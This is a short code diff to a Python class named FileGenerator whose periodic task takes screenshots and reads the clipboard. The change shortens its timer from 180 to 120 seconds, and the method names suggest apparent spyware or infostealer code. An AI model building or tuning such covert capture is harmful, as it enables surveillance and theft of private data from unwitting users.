@@ -84,7 +84,7 @@ class FileGenerator:
         self.screenshot()
         self.get_clipboard_content()
         # Reset the timer
-        threading.Timer(180, self.periodic_tasks).start()
+        threading.Timer(120, self.periodic_tasks).start()
 
     def system_information(self):
         try:
